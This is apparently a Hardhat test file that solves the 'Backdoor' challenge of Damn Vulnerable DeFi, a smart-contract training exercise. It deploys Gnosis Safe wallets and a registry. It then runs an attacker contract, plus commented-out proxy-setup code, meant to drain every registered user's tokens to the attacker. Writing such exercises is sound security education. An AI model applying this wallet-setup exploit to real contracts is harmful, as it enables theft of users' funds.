const { ethers } = require("hardhat");
const { expect } = require("chai");
const { AbiCoder } = require("ethers/lib/utils");
const { Interface } = require("readline");

describe("[Challenge] Backdoor", function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther("40");
    const AMOUNT_PER_USER = ethers.utils.parseEther("10");

    const ERC20Abi = [
        {
            inputs: [
                {
                    internalType: "address",
                    name: "spender",
                    type: "address",
                },
                {
                    internalType: "uint256",
                    name: "amount",
                    type: "uint256",
                },
            ],
            name: "approve",
            outputs: [
                {
                    internalType: "bool",
                    name: "",
                    type: "bool",
                },
            ],
            stateMutability: "nonpayable",
            type: "function",
        },
    ];

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] =
            await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address];
        allAccounts = [
            alice.address,
            bob.address,
            charlie.address,
            david.address,
            deployer.address,
            attacker.address,
        ];

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (
            await ethers.getContractFactory("GnosisSafe", deployer)
        ).deploy();
        this.walletFactory = await (
            await ethers.getContractFactory("GnosisSafeProxyFactory", deployer)
        ).deploy();
        this.token = await (
            await ethers.getContractFactory("DamnValuableToken", deployer)
        ).deploy();

        // Deploy the registry
        this.walletRegistry = await (
            await ethers.getContractFactory("WalletRegistry", deployer)
        ).deploy(
            this.masterCopy.address, //singleton
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(await this.walletRegistry.beneficiaries(users[i])).to.be
                .true;
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(
            this.walletRegistry.address,
            AMOUNT_TOKENS_DISTRIBUTED
        );
    });

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */

        //deploy attacker contract
        const tempFactory = await ethers.getContractFactory(
            "backdoorAttacker",
            attacker
        );
        const backdoorAttacker = await tempFactory.deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users,
            this.walletRegistry.address
        );

        await backdoorAttacker.createBackdoor();

        // const iface = new ethers.utils.Interface(abi);
        // let wFAttacker = await this.walletFactory.connect(attacker);
        // const usersProxy = [];

        // const erc20Iface = new ethers.utils.Interface(ERC20Abi);

        // const setupModuleData = erc20Iface.encodeFunctionData("approve", [
        //     backdoorAttacker.address,
        //     AMOUNT_PER_USER,
        // ]);
        // this.walletFactory.once("ProxyCreation", () => {
        //     this.walletFactory.on("ProxyCreation", (args) => console.log(args));
        // });

        // for (let i = 0; i < 1; i++) {
        //     const setupParams = [
        //         [users[i]],
        //         1,
        //         ethers.constants.AddressZero, //to
        //         //this.token.address, //to
        //         0x00, //data
        //         //setupModuleData, //data
        //         backdoorAttacker.address, //fallbackHanedler
        //         ethers.constants.AddressZero,
        //         0,
        //         ethers.constants.AddressZero,
        //     ];

        //     const initPayload = iface.encodeFunctionData("setup", setupParams);

        //     const tx = await wFAttacker.createProxyWithCallback(
        //         this.masterCopy.address,
        //         initPayload,
        //         1,
        //         this.walletRegistry.address
        //     );

        //     const receipt = await tx.wait();
        //     usersProxy.push(tx);
        // }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);

            // User must have registered a wallet   || this is not done in SETUP SCENARIO step!
            expect(wallet).to.not.eq(
                ethers.constants.AddressZero,
                "User did not register a wallet"
            );

            // User is no longer registered as a beneficiary
            expect(await this.walletRegistry.beneficiaries(users[i])).to.be
                .false;
        }

        // Attacker must have taken all tokens
        expect(await this.token.balanceOf(attacker.address)).to.eq(
            AMOUNT_TOKENS_DISTRIBUTED
        );
    });
});
